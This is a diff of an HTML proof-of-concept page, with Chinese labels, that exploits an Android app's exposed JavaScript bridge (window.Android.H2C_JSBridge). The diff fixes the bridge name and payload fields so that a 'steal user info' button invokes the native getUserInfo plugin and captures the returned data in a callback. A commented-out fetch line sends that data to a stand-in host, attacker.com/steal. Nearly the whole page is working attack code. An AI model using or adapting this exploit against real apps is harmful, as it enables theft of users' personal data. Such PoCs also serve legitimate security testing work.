@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JSBridge 漏洞利用 PoC (最终版)</title>
+    <title>JSBridge 漏洞利用 PoC (最终修正版)</title>
     <style>
         body { font-family: sans-serif; padding: 20px; max-width: 600px; }
-        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 4px; }
-        button:hover { background-color: #0056b3; }
+        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #28a745; color: white; border: none; border-radius: 4px; }
+        button:hover { background-color: #218838; }
         #log { margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px; white-space: pre-wrap; font-family: monospace; }
         .success { color: #28a745; }
         .error { color: #dc3545; }
@@ -17,14 +17,11 @@
 <body>
     <h1>JSBridge 漏洞利用 PoC</h1>
     <button onclick="testGetUserInfo()">窃取用户信息</button>
-    <button onclick="testOpenCamera()">打开相机</button>
-    <button onclick="testGetLocation()">获取位置</button>
     <button onclick="clearLog()">清空日志</button>
     
     <div id="log">等待操作...</div>
 
     <script>
-        // 初始化 vConsole
         new VConsole();
 
         const logEl = document.getElementById('log');
@@ -32,31 +29,26 @@
             const time = new Date().toLocaleTimeString();
             const className = type === 'success' ? 'success' : type === 'error' ? 'error' : '';
             logEl.innerHTML += `<div class="${className}">[${time}] ${msg}</div>`;
-            // 同时打印到 vConsole
             console.log(`[${time}] ${msg}`);
         }
 
         function clearLog() {
             logEl.innerHTML = '日志已清空\n';
-            console.clear(); // 清空 vConsole 日志
+            console.clear();
         }
 
         // 【核心】定义全局回调函数，用于接收原生返回的数据
         function nativeCallback(data) {
-            // === vConsole 重点观察区域 ===
             console.log(">>> [vConsole] nativeCallback 回调被触发! <<<");
             console.log(">>> [vConsole] 收到的原始数据:", data);
-            // ===============================
 
             log('--- nativeCallback 回调触发 ---');
             log(`🎉 收到数据: ${data}`, 'success');
             
-            // 尝试解析 CommJsCallBackInfo 结构
             try {
                 const result = JSON.parse(data);
                 if (result.code === "0") {
                     log(`✅ 操作成功，数据: ${JSON.stringify(result.data)}`, 'success');
-                    // 在这里可以将数据发送到你的服务器
                     // fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(result.data) });
                 } else {
                     log(`❌ 操作失败，原因: ${result.message}`, 'error');
@@ -66,27 +58,25 @@
             }
         }
 
-        // 【核心】使用 jsCallNative 方法进行调用
+        // 【核心修正】使用 H2C_JSBridge 方法进行调用
         function callPlugin(pluginName, params) {
-            if (!window.Android || !window.Android.jsCallNative) {
-                log('❌ window.Android.jsCallNative 不存在', 'error');
+            if (!window.Android || !window.Android.H2C_JSBridge) {
+                log('❌ window.Android.H2C_JSBridge 不存在', 'error');
                 return;
             }
             
             log(`\n--- 调用插件: ${pluginName} ---`);
             
             try {
-                // 构造符合 jsCallNative 要求的 JSON 字符串
+                // 构造符合 H2C_JSBridge 要求的 JSON 字符串
                 const payload = {
-                    method: pluginName,
-                    data: params || {}
+                    name: pluginName, // H2C_JSBridge 解析的是 "name"
+                    param: params || {} // H2C_JSBridge 解析的是 "param"
                 };
-                // === vConsole 重点观察区域 ===
                 console.log(">>> [vConsole] 准备发送 payload:", JSON.stringify(payload));
-                // ===============================
                 
                 // 第二个参数是回调函数名
-                window.Android.jsCallNative(JSON.stringify(payload), 'nativeCallback');
+                window.Android.H2C_JSBridge(JSON.stringify(payload), 'nativeCallback');
                 log('✅ 已发起调用，等待回调...');
             } catch (e) {
                 log(`❌ 调用失败: ${e.message}`, 'error');
@@ -98,17 +88,6 @@
             callPlugin('getUserInfo');
         }
 
-        function testOpenCamera() {
-            clearLog();
-            callPlugin('openCamera');
-        }
-        
-        function testGetLocation() {
-            clearLog();
-            callPlugin('location');
-        }
-
-        // 页面加载时自动扫描
         window.onload = () => {
             log('页面加载完成，点击按钮开始测试');
         };
